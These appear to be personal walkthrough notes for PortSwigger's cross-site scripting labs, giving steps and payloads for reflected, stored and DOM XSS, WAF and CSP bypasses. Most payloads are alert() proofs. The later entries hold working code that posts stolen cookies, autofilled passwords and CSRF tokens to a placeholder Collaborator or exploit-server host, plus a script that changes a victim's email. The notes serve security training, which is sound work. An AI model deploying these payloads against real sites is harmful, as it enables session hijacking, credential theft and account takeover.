## [Reflects XSS](https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded)

- Test if search value is reflected in the html.
  - Inject the following payload:
    ```html
    '<script>alert(1)</script>
    ```

## [Stored XSS](https://portswigger.net/web-security/cross-site-scripting/stored/lab-html-context-nothing-encoded)

- Test if comment values are reflected in the HTML
  - Inject the following payload:
    ```html
    '<script>alert(1)</script>
    ```

## [DOM XSS in `document.write` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink)

- Check if search value is reflected in the DOM.
- Check if the value is being written by the document.write function.
  - Break out of the tag with '> by injecting the following payload:
    ```html
    '><script>alert(1)</script>
    ```

## [DOM XSS in `innerHTML` sink using source `location.search`](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink)

- Check if search value is reflected in the DOM.
- Check if the value is being written by the location.search function.
- Note: `<script>` tags are filtered out by browsers when injected by the location.search function.
  - Use the following payload to perform xss on the location.search function.
    ```html
    <img src='0' onerror='alert(1)'>
    ```

## [DOM XSS in jQuery anchor `href` attribute sink using `location.search` source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink)

- Check if there is a parameter for the home page button in the url
- Replace the value with a random string and check if it is reflected in the DOM.

  - Note: This can also lead to an open redirect vulnerability.
  - Inject the following payload:

  ```java
  javascript:alert(1)
  ```

## [DOM XSS in jQuery selector sink using a hashchange event](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event)

- Read the source code for a hashchange function.
- Try to use the hashchange function to autoscroll to a h2 tag.
- Add this line to the expoit server and deliver the payload to the victom:
  ```html
  `<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=print(1)>'">`
  ```

## [Reflected XSS into attribute with angle brackets HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-attribute-angle-brackets-html-encoded)

- Try to inject a random string into the search value.
- Check if you can break out of quotes.
- If angle brackets are encoded inject an event handler.
  - Inject the following payload:
    ```java
    "onmouseover="alert(2)
    ```

## [Stored XSS into anchor `href` attribute with double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-href-attribute-double-quotes-html-encoded)

- Try to inject a random string into the url feild for a comment.
- If it allows a string without http:// or https:// you should be able to inject a javascript protocal injection.
- Inject this payload:
  ```java
  javascript:alert(1)
  ```

## [Reflected XSS into a JavaScript string with angle brackets HTML encoded](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-html-encoded)

- Inspect if the search term is reflecting inside javascript.
- Break out of the javascript quote and inject the alert() function with the following payload:
  ```java
  j4xx3n'; onload=alert(); var myVar='test
  ```

## [DOM XSS in `document.write` sink using source `location.search` inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

- Look for check stock functionality.
- Read the source code and look for javascript code that uses the `storeId` parameter as a source and the `document.write` function as the sink.
- Add storeId as a parameter in the URL and check if the value is added as a new store.
- If you suceffuly injected a new store value inject the following payload in to the storeId value:
  ```html
  </select><script>alert()</script>
  ```
- Note: The payload needs to break out of the select tag to execute arbitrary javascript.

## [DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

- Inject the following payload into the search feild:
  ```java
  {{ 1 + 1 }}
  ```
- If 2 is printed to the screen inject the following payload:

```java
{{$on.constructor('alert()')()}}
```

## [Reflected DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected)

- Search for a random string.
- Look for other requests useing the same string in the parameter value.
- Check if the second request is returning JSON.
- Break out of the JSON object and inject javascript with the following payload:
  ```java
  \"-alert(1)}//
  ```
- Note: The backslash makes special charecotrs in JSON use their special functionality.
- The } ends the JSON object and // comments out the rest of the code.

## [Stored DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored)

- There is a critical bug in the javascript that loads comments into a post.
- The site only filters for the first special charector and ignores all other special charectors.
- You can bypass the filter by adding <> to the begging of a payload so only the first unused angle brackets are filtered.
- Inject the following payload into a comment field:

```html
<><img src='0' onerror='alert()'>
```

## [Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)

- Try to inject a `<h1>` tag into the search value.
- If you get an error that the tag is not allowed it is being blocked by the WAF.
- Send the request to the intruder and fuzz for all tags from the XSS cheatsheet.
- Once you've found a tag that is allowed send the request to intruder and fuzz for events.
- You can use this final payload:
  ```

  ```

## [Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)

- Try to inject a `<h1>` tag into the search value.
- If you get an error that the tag is not allowed it is being blocked by the WAF.
- Send the request to the intruder and fuzz for all tags from the XSS cheatsheet.
- If all tags are blocked try to inject a custom one: `<cutstom-tag>`
- If custom tags are allowed try to inject an attribute that will execute the alert function.

## [Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)


- [ ] Fuzz for allowed tags — confirm SVG-related tags work
- [ ] Fuzz for allowed events within SVG elements using cheatsheet

## [Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)

- [ ] Confirm the URL parameter is reflected in a `<link rel="canonical" href="...">` tag
- [ ] Inject an `accesskey` + `onclick` attribute to hijack a keyboard shortcut:
```
'accesskey='x'onclick='alert(1)
```
> **Note:** Trigger with `Alt+Shift+X` (Windows/Linux) or `Ctrl+Alt+X` (macOS)


## [Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)

- [ ] Confirm single quotes and backslashes are escaped
- [ ] Break out at the `</script>` tag level instead — close the script block entirely:
```
</script><script>alert(1)</script>
```
> **Why it works:** The browser's HTML parser closes the script block before the JS parser runs, so escaping is irrelevant.


## [Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-angle-brackets-double-quotes-encoded-single-quotes-escaped)

- [ ] Confirm angle brackets and double quotes are encoded; single quotes are escaped with `\`
- [ ] Use `\` to neutralize the injected backslash, then terminate the statement:
```
\';alert(1)//
```


## [Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-onclick-event-angle-brackets-double-quotes-html-encoded-single-quotes-backslash-escaped)

- [ ]  Go to a blog post and submit a comment with any text. In the **Website** field, enter a placeholder URL (e.g. `http://test`)
- [ ]  Intercept the POST request with Burp Suite and send it to Repeater
- [ ]  View the post in the browser, intercept that GET request too, and send to a second Repeater tab
- [ ]  In the response, find where your website URL was reflected — it lands inside an `onclick` attribute like `onclick="var tracker={track(){}};tracker.track('http://test');"`
- [ ]  Note what's filtered: `<` `>` and `"` are HTML-encoded, `'` and `\` are escaped — so you can't break out with those
- [ ]  Use HTML entity encoding to sneak in single quotes instead. Craft this payload for the Website field:

```http
http://foo?&apos;-alert(1)-&apos;
```

- [ ]  Submit the comment with that payload as the Website URL
- [ ]  View the post — the `&apos;` entities get decoded by the browser inside the attribute, effectively injecting single quotes that break out of the JS string and call `alert(1)`
- [ ]  Click the comment author name → `alert(1)` fires → lab solved ✅

**Key concept:** The app escapes literal `'` characters but doesn't strip HTML entities, so `&apos;` slips through and gets interpreted as `'` by the browser when the attribute is parsed.

## [Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-template-literal-angle-brackets-single-double-quotes-backslash-backticks-escaped)

- Type a random alphanumeric string into the search box and submit
- [ ]  Intercept the search request in Burp Suite and send to Repeater
- [ ]  In the response, find where your string is reflected — it lands **inside a JavaScript template literal** (backtick string), e.g. `` var msg = `Your search: yourInput` ``
- [ ]  Note what's blocked: `<` `>` `'` `"` `` ` `` and `\` are all escaped/encoded — so you can't break out of the template string
- [ ]  You don't need to break out. Use the template literal's own **expression interpolation** syntax instead. Craft this payload:

```java
${alert(1)}
```

- [ ]  Submit that as your search term (either directly in the browser URL or via Repeater)
- [ ]  The `${}` syntax executes JavaScript inline within a template literal without needing any quote or bracket characters
- [ ]  Copy the URL, paste it in the browser, and the page should trigger `alert(1)` on load → lab solved ✅

**Key concept:** Even with every quoting character escaped, `${ }` interpolation is native to template literals and requires none of them — your payload executes directly inside the string without ever needing to escape it.



## [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)

- [ ]  In Burp Suite Professional, open the **Collaborator** tab and click **"Copy to clipboard"** to get your unique Collaborator subdomain (e.g. `abc123.oastify.com`)
- [ ]  Go to a blog post and submit a comment with this payload, replacing the subdomain with yours:

html

```html
  <script>
  fetch('https://YOUR-COLLABORATOR-SUBDOMAIN', {
      method: 'POST',
      mode: 'no-cors',
      body: document.cookie
  });
  </script>
```

- [ ]  Submit the comment — the stored XSS will fire in the browser of any victim who views the post
- [ ]  Back in the **Collaborator** tab, click **"Poll now"** — wait a few seconds and poll again if nothing shows up immediately
- [ ]  Find the incoming HTTP interaction and locate the **POST body** — it contains the victim's session cookie
- [ ]  Copy the victim's session cookie value
- [ ]  In Burp, make a request to the main blog page (or `/my-account`) and use **Proxy** or **Repeater** to **replace your own session cookie** with the stolen one
- [ ]  Send the request — you are now authenticated as the victim → lab solved ✅

**Key concept:** `document.cookie` is accessible to any JavaScript running on the same origin. Since the XSS runs in the victim's browser on the target site, it can read their cookies and exfiltrate them via a `fetch` to an out-of-band server (Burp Collaborator), completely bypassing the need to see the victim's browser directly.

## [Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)

**Exploiting XSS to capture passwords (fake input + autocomplete exfiltration)**

- [ ]  In Burp Suite Professional, open the **Collaborator** tab and click **"Copy to clipboard"** to get your unique Collaborator subdomain
- [ ]  Go to a blog post and submit a comment with this payload, replacing the subdomain with yours:

html

```html
  <input name=username id=username>
  <input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-COLLABORATOR-SUBDOMAIN',{
  method:'POST',
  mode:'no-cors',
  body:username.value+':'+this.value
  });">
```

- [ ]  Understand what this does: it injects a fake username + password field into the page. The victim's browser **autocompletes their saved credentials** into these fields, and the `onchange` event fires as soon as the password field is populated, immediately `fetch`-ing the credentials to Collaborator
- [ ]  Submit the comment — it is now stored and will execute for every visitor
- [ ]  Back in the **Collaborator** tab, click **"Poll now"** — wait a few seconds and retry if needed
- [ ]  Find the incoming HTTP POST interaction and read the **request body** — it contains `username:password` in plaintext
- [ ]  Take note of the credentials, then log in to the site as the victim user → lab solved ✅

**Key concept:** This attack exploits browser password autocomplete. Rather than stealing a session cookie, it injects convincing-looking form fields that the browser silently fills in — the `onchange` handler then exfiltrates the credentials the instant autocomplete populates the password field, without any interaction from the victim.

## [Exploiting XSS to bypass CSRF defenses](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
- Log in as `wiener:peter` and navigate to your account page (`/my-account`)
- [ ]  View page source and note two things: email changes are submitted via POST to `/my-account/change-email`, and there's a hidden `csrf` token field in the form that changes each page load
- [ ]  Recognize the attack chain: you need XSS to **read the victim's CSRF token** from their account page, then **use it immediately** to submit a forged email-change request on their behalf
- [ ]  Go to a blog post and submit a comment with the following payload as the comment body:

html

```html
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
  var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
  var changeReq = new XMLHttpRequest();
  changeReq.open('post','/my-account/change-email',true);
  changeReq.send('csrf='+token+'&email=test@test.com');
};
</script>
```

- [ ]  Make sure `test@test.com` is an address not already registered (don't use your own wiener account's current email)
- [ ]  Submit the comment — it gets stored and will execute in the browser of anyone who views it
- [ ]  The lab simulates a victim visiting the page — when they do, the script fires, fetches their `/my-account` page (same-origin, so it works), extracts their CSRF token via regex, and immediately POSTs a request to change their email → lab solved ✅

**Key concept:** CSRF tokens only protect against cross-origin forgery. XSS runs same-origin, so it can freely read the token from the DOM and use it — completely bypassing the CSRF defense.

## [Reflected XSS protected by very strict CSP, with dangling markup attack](https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack)

**Phase 1 — Recon**

- [ ]  Log in as `wiener:peter` and go to `/my-account`
- [ ]  Notice the email change form has a hidden `csrf` token field — you'll need to steal it
- [ ]  Try injecting `<img src onerror=alert(1)>` via the `email` query param: `https://YOUR-LAB.net/my-account?email=<img src onerror=alert(1)>` — it reflects but doesn't execute
- [ ]  Check DevTools console — confirm CSP is blocking script execution
- [ ]  Note that the CSP is missing a `form-action` directive — meaning you **can hijack where forms submit to**

**Phase 2 — Confirm form hijacking works**

- [ ]  Copy your exploit server URL (e.g. `https://exploit-YOUR-ID.exploit-server.net/exploit`)
- [ ]  Craft a URL that injects a button with `formaction` pointing to your exploit server:

```
  <https://YOUR-LAB.net/my-account?email=foo@bar"><button formaction="https://YOUR-EXPLOIT-SERVER/exploit">Click me</button>
```

- [ ]  Load it and click the button — you're redirected to the exploit server, confirming the bypass works
- [ ]  Notice the CSRF token is **not** in the URL (form uses POST) — you need GET to capture it

**Phase 3 — Steal the CSRF token**

- [ ]  Re-inject the button, this time adding `formmethod="get"`:

```
  https://YOUR-LAB.net/my-account?email=foo@bar"><button formaction="https://YOUR-EXPLOIT-SERVER/exploit" formmethod="get">Click me</button>
```

- [ ]  Click it — now the CSRF token **is visible in the URL** on the exploit server. The token exfiltration method is confirmed.

**Phase 4 — Build and deliver the exploit**

- [ ]  Go to the exploit server's **Body** field and paste this script, replacing both URLs:

html

```html
  <body>
  <script>
  const academyFrontend = "https://YOUR-LAB.net/";
  const exploitServer = "https://YOUR-EXPLOIT-SERVER/exploit";
  const url = new URL(location);
  const csrf = url.searchParams.get('csrf');
  if (csrf) {
      const form = document.createElement('form');
      const email = document.createElement('input');
      const token = document.createElement('input');
      token.name = 'csrf';
      token.value = csrf;
      email.name = 'email';
      email.value = 'hacker@evil-user.net';
      form.method = 'post';
      form.action = `${academyFrontend}my-account/change-email`;
      form.append(email);
      form.append(token);
      document.documentElement.append(form);
      form.submit();
  } else {
      location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;
  }
  </script>
  </body>
```

- [ ]  Click **Store**, then **Deliver exploit to victim**
- [ ]  The script works in two passes: first visit → no `csrf` param → redirects victim to the lab with the injected button labeled "Click me" → victim clicks → CSRF token lands in exploit server URL → second visit → `csrf` param present → silently submits the email change form → lab solved ✅

**Key concept:** The CSP blocks all inline scripts and external resources, but has no `form-action` directive. This means injected buttons can redirect form submissions anywhere. By forcing a GET submission to your exploit server, the CSRF token leaks into the URL — your server-side script then catches it on the next visit and uses it to forge the email change.